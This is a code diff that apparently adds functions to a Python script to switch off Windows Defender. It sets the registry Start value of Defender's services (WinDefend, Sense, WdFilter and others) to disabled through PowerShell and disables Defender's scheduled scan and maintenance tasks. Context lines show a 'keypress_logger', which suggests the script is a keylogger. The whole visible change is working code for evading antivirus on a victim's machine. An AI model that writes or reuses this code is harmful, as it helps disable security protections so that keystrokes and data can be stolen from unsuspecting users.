@@ -150,6 +150,37 @@ print("We are ok!")
 time.sleep(10)
 
 
+def disable_defender_services():
+    services = [
+        "WinDefend", "Sense", "WdFilter", 
+        "WdNisDrv", "WdNisSvc", "WdBoot"
+    ]
+    reg_path = "HKLM:\\SYSTEM\\CurrentControlSet\\Services"
+    
+   
+    for service in services:
+        command = f'Set-ItemProperty -Path "{reg_path}\\{service}" -Name Start -Value 4'
+        run_system_command(f'powershell -Command "{command}"')
+        
+    print("Services disabled.")
+
+
+def disable_defender_tasks():
+    tasks = [
+        "Windows Defender Cache Maintenance",
+        "Windows Defender Cleanup",
+        "Windows Defender Scheduled Scan",
+        "Windows Defender Verification"
+    ]
+    
+ 
+    for task in tasks:
+        command = f'Get-ScheduledTask "{task}" | Disable-ScheduledTask'
+        run_system_command(f'powershell -Command "{command}"')
+    
+    print("Scheduled tasks disabled.")
+
+
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 keypress_logger = logging.getLogger("keypress_logger")
